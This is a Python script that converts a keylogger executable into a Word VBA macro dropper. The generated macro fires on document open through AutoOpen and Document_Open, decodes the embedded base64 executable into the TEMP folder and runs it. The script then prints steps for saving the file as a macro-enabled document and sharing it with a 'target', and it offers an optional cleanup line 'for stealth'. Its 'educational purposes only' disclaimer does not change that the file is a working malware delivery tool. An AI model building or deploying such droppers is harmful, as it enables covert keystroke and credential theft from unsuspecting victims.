#!/usr/bin/env python3
"""
Aetriks Keylogger - EXE to VBA Converter
Converts the keylogger executable to VBA code for embedding in Word documents.

DISCLAIMER: This is for educational purposes only.
Use only on systems you own or have explicit permission to test.
"""

import os
import base64
import sys

def exe_to_vba(exe_path, output_path="output.vba"):
    """
    Convert executable file to VBA code
    
    Args:
        exe_path (str): Path to the executable file
        output_path (str): Output VBA file path
    """
    try:
        # Check if executable exists
        if not os.path.exists(exe_path):
            print(f"[ERROR] Executable not found: {exe_path}")
            return False
        
        # Read the executable file
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # Convert to base64
        exe_base64 = base64.b64encode(exe_data).decode('utf-8')
        
        # Generate VBA code
        vba_code = f'''Sub AutoOpen()
    ' Aetriks Keylogger - Auto-execution macro
    ' This macro will execute when the document is opened
    
    Dim exePath As String
    Dim exeData As String
    Dim fileNum As Integer
    
    ' Base64 encoded executable data
    exeData = "{exe_base64}"
    
    ' Create temporary file path
    exePath = Environ$("TEMP") & "\\aetriks_keylogger.exe"
    
    ' Write executable to temporary file
    fileNum = FreeFile
    Open exePath For Binary As fileNum
    Put fileNum, 1, DecodeBase64(exeData)
    Close fileNum
    
    ' Execute the keylogger
    Shell exePath, vbNormalFocus
    
    ' Clean up (optional - for stealth)
    ' Kill exePath
End Sub

Function DecodeBase64(base64String As String) As String
    ' Decode base64 string to binary data
    Dim xmlDoc As Object
    Dim xmlNode As Object
    
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.DataType = "bin.base64"
    xmlNode.Text = base64String
    DecodeBase64 = xmlNode.NodeTypedValue
End Function

Sub Document_Open()
    ' Alternative auto-execution trigger
    Call AutoOpen
End Sub
'''
        
        # Write VBA code to file
        with open(output_path, 'w') as f:
            f.write(vba_code)
        
        print(f"[SUCCESS] VBA code generated: {output_path}")
        print(f"[INFO] Executable size: {len(exe_data)} bytes")
        print(f"[INFO] Base64 size: {len(exe_base64)} characters")
        print("[INFO] Instructions:")
        print("1. Open Microsoft Word")
        print("2. Press Alt+F11 to open VBA editor")
        print("3. Insert a new module")
        print("4. Copy and paste the generated VBA code")
        print("5. Save the document as .docm (macro-enabled)")
        print("6. Share the document with target")
        
        return True
        
    except Exception as e:
        print(f"[ERROR] Conversion failed: {e}")
        return False

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print("Usage: python exe_to_vba.py <executable_path> [output_path]")
        print("Example: python exe_to_vba.py dist/aetriks-keylogger.exe output.vba")
        return
    
    exe_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else "output.vba"
    
    print("[INFO] Aetriks EXE to VBA Converter")
    print(f"[INFO] Input: {exe_path}")
    print(f"[INFO] Output: {output_path}")
    print()
    
    success = exe_to_vba(exe_path, output_path)
    
    if success:
        print("\n[SUCCESS] Conversion completed successfully!")
    else:
        print("\n[ERROR] Conversion failed!")
        sys.exit(1)

if __name__ == "__main__":
    main() 